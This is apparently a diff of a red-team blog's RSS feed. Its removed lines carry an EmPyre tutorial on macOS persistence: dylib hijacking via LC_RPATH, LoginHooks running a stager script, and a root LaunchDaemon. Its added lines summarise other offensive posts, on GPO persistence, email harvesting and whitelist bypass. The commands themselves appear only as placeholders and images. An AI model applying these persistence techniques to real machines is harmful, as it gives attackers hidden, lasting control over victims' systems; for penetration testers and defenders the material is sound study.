-&lt;p&gt;&lt;strong&gt;Figure 1&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture1.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture1.png&#34; alt=&#34;Picture1&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 2&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture2.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture2.png&#34; alt=&#34;Picture2&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Figure 1 depicts the load commands for Xcode. Load commands provide the OS loader with instructions on where to find the application&amp;rsquo;s entry point, offsets for the text and data sections, and all of the libraries needed by the application at runtime. The “Name” field in the LC_LOAD_DYLIB load command identifies the file path to the DVTFoundation library. Notice that the path is prepended with @rpath. This signals to the OS loader to examine the LC_RPATH (Figure 2) load commands in order to expand the @rpath variable. Each path is searched in succession by dyld to locate the required library. Once the library is found it is loaded into the application at runtime. The issue is that any library planted in an LC_RPATH that is found before the legitimate dylib, will be loaded first. A slight variation to this attack, which we won’t cover in this post, involves the LC_LOAD_WEAK_DYLIB load command. This indicates that the specified dylib is not required but will be loaded if found. If the specified library is not present on the system, we can plant the dylib in the specified path and it will be loaded by the application at runtime. For more information on Dylib Hijacks for weak dylibs, please read the &lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;white paper&lt;/a&gt; on Dylib Hijacks by @patrickwardle. The load commands slightly differ but still offer the same way to conduct this attack. We can abuse dyld’s load order to obtain consistent code execution and/or persistence in OS X.&lt;/p&gt;
-
-&lt;p&gt;Before we can weaponize Dylib Hijacks, there is a small problem to address. When an application normally loads a library, the os loader will try to resolve symbols for functions required by the application. If those functions are not found, the application will crash. To remedy this, the hijacking dylib will need to have a LC_REEXPORT_DYLIB load command that provides the path to the legitimate dylib. When the application starts, it will load the attacking dylib first and then load the legitimate dylib.&lt;/p&gt;
-
-&lt;p&gt;To carry out this attack in EmPyre, you will need to first run the HijackScanner module in situational_awareness/host/osx/. This is simply an adaption to @patrickwardle’s &lt;a href=&#34;https://github.com/synack/DylibHijack/blob/master/scan.py&#34;&gt;python script&lt;/a&gt; to scan the system for Mach-O binaries, load each and examine the load commands to determine if the application is vulnerable.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 3&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture3.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture3.png&#34; alt=&#34;Picture3&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;With the default options for the module, every Mach-O binary on the file system will be examined, which can take quite some time. To speed up the scan, set a path or only scan loaded process executables. Once the scan is finished, your output will provide you with the path to the vulnerable binary and the full path to where an EmPyre dylib should be planted. You will also need to locate the legitimate dylib for the next module in this attack.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 4&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture4.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture4.png&#34; alt=&#34;Picture4&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Here we see that the Xcode application is vulnerable to a dylib hijack with the DVTFoundation library. Instructions are provided after the scan output to gather the information necessary for the next module.&lt;/p&gt;
-
-&lt;p&gt;The CreateHijacker module in persistence/osx/ configures an EmPyre dylib to be used in a Dylib Hijack. This is yet another slightly &lt;a href=&#34;https://github.com/synack/DylibHijack/blob/master/createHijacker.py&#34;&gt;modified script&lt;/a&gt; written by @patrickwardle. This module does all the heavy lifting for configuring the EmPyre dylib and patching in the path to the legitimate dylib.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 5&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture5.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture5.png&#34; alt=&#34;Picture5&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;The Listener, UserAgent, and Arch options are all used to generate the hijacker dylib. Be sure that the architecture of the dylib matches the architecture of the vulnerable application. The “LegitimateDylibPath” option will define the full path to the legitimate dylib loaded into the application. The “vulnerableRPATH” refers to the rpath value returned from the HijackScanner module. Once we have all of our options set, we can execute the module.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 6&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture6.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture6.png&#34; alt=&#34;Picture6&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;In Figure 6, we see that once the module is completed, an EmPyre dylib is configured and copied to the vulnerable rpath we specified. When we start the Xcode application, we receive a new EmPyre agent running in that application’s process!&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 7&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture7.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture7.png&#34; alt=&#34;Picture7&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 8&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture8.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture8.png&#34; alt=&#34;Picture8&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Important Note: In some cases, killing the agent will close the application. Closing the application will always kill the agent.&lt;/p&gt;
-
-&lt;h2 id=&#34;loginhooks&#34;&gt;LoginHooks&lt;/h2&gt;
-
-&lt;p&gt;Just like the many supported startup locations and run keys within Windows, OS X offers a few which are deprecated but still functional (&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&lt;/a&gt;). On the newest version of OS X, El Capitan,  “LoginHooks” seem to be an extremely reliable method of persistence and can be removed with ease. Here are a few things to note about “LoginHooks” and how they can be used:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;     Permissions for your script file should include execute privileges for the appropriate users.&lt;/li&gt;
-&lt;li&gt;     The payload will execute for any user that logs in.&lt;/li&gt;
-&lt;li&gt;     Only one copyof each script can be installed at a time and root privileges are needed!&lt;/li&gt;
-&lt;li&gt;     If a user variable is required for login logic the $1 is passed your script.&lt;/li&gt;
-&lt;li&gt;     Other login actions wait until your hook finishes executing&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;A benefit to using LoginHooks is the ease of installation, and target system info enumeration using the “defaults” tool. This tool also allows you to write settings to multiple sub system settings. Here is manual process to  setup a Hook:&lt;/p&gt;
-
-&lt;p&gt;[snippet id=&amp;ldquo;37&amp;rdquo;]&lt;/p&gt;
-
-&lt;p&gt;To remove this hook all you would need to do is use the defaults tool to delete it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;[snippet id=&amp;quot;35&amp;quot;]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lastly to read the hook settings you setup:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;[snippet id=&amp;quot;36&amp;quot;]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Here is a small demo I setup to show the install process of the LoginHook. First start out by setting up EmPyre, creating a listener, and getting your launcher executed in your test VM. Once the C2 is set up we will need to build out AppleScript that will be used for the persistence execution.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 9&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture9.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture9.png&#34; alt=&#34;Picture9&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;This will output AppleScript with a simple stager to the current working directory. Next, we will have to upload the script to a directory of the operator’s choice. In this case, I just used the /tmp/ directory store my “evilscript”. To set up the hook is very simple, set the user password, this is for the sudo that takes place to install the hook and creating proper permissions on the script. This can be seen being set up in Figure 9.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 10&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture10.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture10.png&#34; alt=&#34;Picture10&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Running the defaults read command we covered earlier will result in the output of the LoginHook location, this is to ensure our hook is in place:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 11&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture11.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture11.png&#34; alt=&#34;Picture11&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;At this point, the LoginHook is properly setup and installed. Anytime the user logs in, the agent will be executed. It should be noted that this method of persistence is widely known and signatured by anti-virus solutions that look for OS X specific persistence.  &lt;/p&gt;
-
-&lt;h2 id=&#34;launchdaemon-s&#34;&gt;LaunchDaemon’s&lt;/h2&gt;
-
-&lt;p&gt;As we talked about earlier, Apple does not approve of the many methods used to stay persistent or they are purely outdated according to the Apple development references (&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1&lt;/a&gt;). But when it comes to launching custom daemons, using ‘launchd’ is the preferred method according to Apple&amp;rsquo;s development documentation. One of the major concerns with LoginHooks are the blocking nature during execution. LoginHooks are executed during the start of a logon session, which is an inline execution of the script. If at anytime this hangs or does not launch correctly it will deadlock the user from logging in. Using launchdaemons allows you live outside of user context, giving it an amazing benefit of how execution takes place. Here are few benefits of using a daemon:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Supports inetd-style daemons&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;launchd runs as root ( Keeps it easy to run )&lt;/li&gt;
-&lt;li&gt;Daemons launch on demand, communication requests do not fail if the daemon is not launched ( Just in case you mess up )&lt;/li&gt;
-&lt;li&gt;If taxed they are simply delayed until the daemon can launch and process them. ( important as they are not blocking on login etc)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;If these reasons are not enough for an operator, I don’t know what is. It’s an extremely clean and safe method of staying persistent on your target; however few downsides do exist:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Many defensive tools look here for persistence (as it’s a limited attack surface)&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;KnockKnock  - &lt;a href=&#34;https://objective-see.com/products/knockknock.html&#34;&gt;https://objective-see.com/products/knockknock.html&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;Uninstallation is a few extra steps.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;We should first cover how the OS boot process works at high level to understand where your persistence will be living. When starting to work in the persistence realm, it&amp;rsquo;s extremely important to understand the small nuances such as system daemons and user agent daemons. Here is a chart I put together to quickly understand how daemons are executed upon boot and login.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 12&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture12.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture12.png&#34; alt=&#34;Picture12&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Currently EmPyre supports installing a “SYSTEM” level daemon running as root that is not dependent on a user being active. This can be very important in some cases and gives you an advantage compared to other methods. Now in Figure 11 we mentioned that the launchd service will locate the plist (property list) file, this is the core of the service and passes the required options that are associated with the service. When launchd starts up it will parse this file and decide when to start, pass arguments or listen on SOCKETS for IPC (Inter Process Communication) so it important that we have an idea of what we are installing. Here is the plist file used:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 13&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture13.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture13.png&#34; alt=&#34;Picture13&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;A few main things should be noted, the Label key string value will be the name of the daemon, in this case the default Is “com.proxy.initialize”. Whereas the array string will be location plus the executable. Finally the key “RunAtLoad” and “KeepAlive” tells launchd to start at system init and stay running rather than a one-time process.&lt;/p&gt;
-
-&lt;p&gt;To install the daemon you perform the following. Start by elevating your context to root.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 14&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture14.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture14.png&#34; alt=&#34;Picture14&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;After you have an elevated agent we can go ahead and setup the persistence, using the “persistence/osx/launchdaemonexecutable”.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 15&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture15.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture15.png&#34; alt=&#34;Picture15&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;That’s it, EmPyre does all the nitty-gritty work of creating the executable, writing it to disk, building the plist and registering it to launchd! When testing is complete we can use the “RemoveDaemon” module to properly clean up. (*Remember to take notes on the paths during install!)&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Figure 16&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Picture16.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Picture16.png&#34; alt=&#34;Picture16&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Hope this can get you started and maybe give you some ideas of where persistence can also be installed!&lt;/p&gt;
-
-&lt;p&gt;References :&lt;/p&gt;
-
-&lt;p&gt;OS X Persistence-&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf&#34;&gt;https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;OS X boot Process-&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;LoginHooks- &lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Launchd-&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&#34;&gt;https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf&#34;&gt;https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Dylib Hijacks-&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&lt;/a&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/05/return-empyre-series-3/</guid>
+      <description>This post is number 3 of the EmPyre series and cross post with a fellow friend and ATD co-worker @xorrior. Thanks to the entire ATD family and dev team of EmPyre:
+@rvrsh3ll &amp;ndash; @harmj0y &amp;ndash; @xorrior &amp;ndash; @CptJesus
+EmPyre can be found here: https://github.com/adaptivethreat/EmPyre
+5/12/16 – Building an EmPyre with Python
+5/18/16 – Operating with EmPyre
+ EmPyre Persistence Mac OS X offers several methods to abuse system functionality and obtain persistence through reboots.</description>
     </item>
     
     <item>
       <title>Operating in an OSX Heavy Environment</title>
-      <link>https://cybersyndicates.com/presentations/osx-way/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/presentations/osx-way/</link>
       <pubDate>Mon, 18 Apr 2016 02:13:50 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/presentations/osx-way/</guid>
-      <description>
-
-
-&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
-  &lt;iframe src=&#34;//www.youtube.com/embed/5y18oKW27KE&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
- &lt;/div&gt;
-
-
-&lt;h3 id=&#34;slide-share&#34;&gt;Slide Share&lt;/h3&gt;
-
-&lt;p&gt;&lt;iframe src=&#34;//www.slideshare.net/slideshow/embed_code/key/7pWN9yEVUvZo4&#34; width=&#34;595&#34; height=&#34;485&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;//www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way&#34; title=&#34;External to DA, the OS X Way&#34; target=&#34;_blank&#34;&gt;External to DA, the OS X Way&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a target=&#34;_blank&#34; href=&#34;//www.slideshare.net/StephanBorosh&#34;&gt;Stephan Borosh&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/presentations/osx-way/</guid>
+      <description>Slide Share   External to DA, the OS X Way  from Stephan Borosh</description>
     </item>
     
     <item>
       <title>Alexander Rymdeko-Harvey</title>
-      <link>https://cybersyndicates.com/page/alex-rymdeko-harvey/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/page/alex-rymdeko-harvey/</link>
       <pubDate>Sun, 03 Apr 2016 02:13:50 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/page/alex-rymdeko-harvey/</guid>
-      <description>
-
-&lt;h3 id=&#34;rat-repurposing-adversarial-tradecraft&#34;&gt;RAT - Repurposing Adversarial Tradecraft&lt;/h3&gt;
-
-&lt;p&gt;&lt;iframe src=&#34;//www.slideshare.net/slideshow/embed_code/key/xP4PRrSuJQGOb2&#34; width=&#34;595&#34; height=&#34;485&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;//www.slideshare.net/AlexanderRymdekoHarv/rat-repurposing-adversarial-tradecraft&#34; title=&#34;RAT - Repurposing Adversarial Tradecraft&#34; target=&#34;_blank&#34;&gt;RAT - Repurposing Adversarial Tradecraft&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a target=&#34;_blank&#34; href=&#34;//www.slideshare.net/AlexanderRymdekoHarv&#34;&gt;Alexander Rymdeko-Harvey&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/page/alex-rymdeko-harvey/</guid>
+      <description>RAT - Repurposing Adversarial Tradecraft   RAT - Repurposing Adversarial Tradecraft  from Alexander Rymdeko-Harvey</description>
     </item>
     
     <item>
       <title>The Team</title>
-      <link>https://cybersyndicates.com/page/team/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/page/team/</link>
       <pubDate>Sun, 03 Apr 2016 02:13:50 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/page/team/</guid>
-      <description>
+      <guid>http://cybersyndicates.obscuritylabs.com/page/team/</guid>
+      <description>Alexander Rymdeko-Harvey  
+Keelyn Roberts  
+Daniel West</description>
+    </item>
+    
+    <item>
+      <title>Email Verification and Email Name Creation</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/02/email-harvesting-and-name-creation/</link>
+      <pubDate>Sun, 14 Feb 2016 14:23:45 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/02/email-harvesting-and-name-creation/</guid>
+      <description>Over the past few months we have been rapidly expanding the capability of SimplyEmail. While it is a very simple tool, it has been extremely successful on a few live engagements I have been on. I feel like it is ready for recommendation to say the least. I did however notice a few key features that some of the guys on the team mentioned that would be nice to have integrated.</description>
+    </item>
+    
+    <item>
+      <title>SYSTEM Context Persistence in GPO Startup Scripts</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/01/system-context-persistence-in-gpo-startup/</link>
+      <pubDate>Mon, 25 Jan 2016 04:32:51 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/01/system-context-persistence-in-gpo-startup/</guid>
+      <description>Interesting enough I was recently experimenting on GPO settings to configure my Applocker for testing and came by Scripts under the (Computer Configuration) settings for GPO. This defiantly caught my attention, since persistence is a cat and mouse game of stored locations / methods. This has been mentioned but I haven&amp;rsquo;t seen it talked about so hey why not share what I did
 
-&lt;h2 id=&#34;alexander-rymdeko-harvey&#34;&gt;Alexander Rymdeko-Harvey&lt;/h2&gt;
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui&#34; data-width=&#34;400&#34; data-height=&#34;150&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;keelyn-roberts&#34;&gt;Keelyn Roberts&lt;/h2&gt;
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;slacker007&#34; data-width=&#34;400&#34; data-height=&#34;150&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;daniel-west&#34;&gt;Daniel West&lt;/h2&gt;
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;reaperb0t&#34; data-width=&#34;400&#34; data-height=&#34;150&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-</description>
+I knew I wanted to weaponize it from a pure command line standpoint as the configuration utility is pretty much point and click.</description>
+    </item>
+    
+    <item>
+      <title>Scanning Effectively Through a SOCKS Pivot with Nmap and Proxychains</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/</link>
+      <pubDate>Sun, 13 Dec 2015 19:14:20 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/</guid>
+      <description>When ever I am on a pen-test and I come across a major problem (Every OP) that requires some creative solution and I love to share it. Not only that I could help someone else one day, but it really helps me retain the knowledge for future use.
+This past engagement we where on a very unique network dealing with ICS devices and a ton of Unix backend servers, while still handling our normal pen test methodology on the side (No Time to play).</description>
+    </item>
+    
+    <item>
+      <title>SimplyEmail v0.5: PDFMiner!</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/11/simplyemail-v0-5-pdfminer/</link>
+      <pubDate>Sat, 21 Nov 2015 18:32:48 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/11/simplyemail-v0-5-pdfminer/</guid>
+      <description>Major addition to SimplyEmail Core When I first started this project I published a pretty in-depth “path” of progression. I told my self I would be following this to help build a tool that would actually enhance and build off what is already open source. I knew I had to have unique methods and content. One thing that I use quite often is google dorking for multiple Intel gathering techniques for a OP, so I knew this had to be added!</description>
+    </item>
+    
+    <item>
+      <title>Email Harvesting with SimplyEmail</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/11/email-harvesting-with-simplyemail/</link>
+      <pubDate>Sat, 21 Nov 2015 14:58:47 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/11/email-harvesting-with-simplyemail/</guid>
+      <description>Email Recon Made Easy More often than not email enumeration is hit or miss, depending on the sources used throttle limits are in place or they just plain don’t index everything. As you may know from my past blog write-up I wrote a HTML scrapper to integrate into theHarvester. After that experience I knew there was for some improvement on 3 major key areas:
+ Speed - It needed to be able to handle way more locations to search</description>
+    </item>
+    
+    <item>
+      <title>A No Bull Guide to Malicious Windows Trouble Shooting Packs and Application whitelist Bypass</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</link>
+      <pubDate>Fri, 16 Oct 2015 13:36:50 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</guid>
+      <description>Malicious Windows Trouble Shooting Package Using Nicholas Berthaume Recent work on WTP:
+@nberthaume
+Just some background on this before we deep dive into setup and construction of the package. I was let onto this a few months back from a coworker. I know this was a pretty cool concept and could see the real world benefit of using something like this on a Red Team in a high security environment.</description>
+    </item>
+    
+    <item>
+      <title>Importing Burp Suite CA cert .der into Kali for API testing</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/10/importing-burp-suite-ca-cert-der-into-kali-for-api-testing/</link>
+      <pubDate>Thu, 01 Oct 2015 15:15:53 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/10/importing-burp-suite-ca-cert-der-into-kali-for-api-testing/</guid>
+      <description>Importing Burp Suite CA Just recently I had to test some API calls with a custom tool written to work with RestClient, unfortunately RestClient uses OpenSSL to check the SSL against the known root CA. This throws a nice error, like invalid certificate error when trying to point your bash shell at the HTTP proxy like Burp. With tons of headache I really couldn&amp;rsquo;t find any good info on importing the SSL certs to Kali from burps CA export function.</description>
+    </item>
+    
+    <item>
+      <title>Windows Driver and Service enumeration with Python</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/09/windows-driver-and-service-enumeration-with-python/</link>
+      <pubDate>Thu, 17 Sep 2015 20:13:43 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/09/windows-driver-and-service-enumeration-with-python/</guid>
+      <description>With malware becoming more and more sophisticated, it is becoming extremely difficult to identify malware on infected systems. DLL hijacking, reflected DLL&amp;rsquo;s, and exploiting vulnerable kernel drivers has become extremely popular. As it turns out Windows makes communication between user mode programs and kernel driver -1 this fairly easy for attackers:
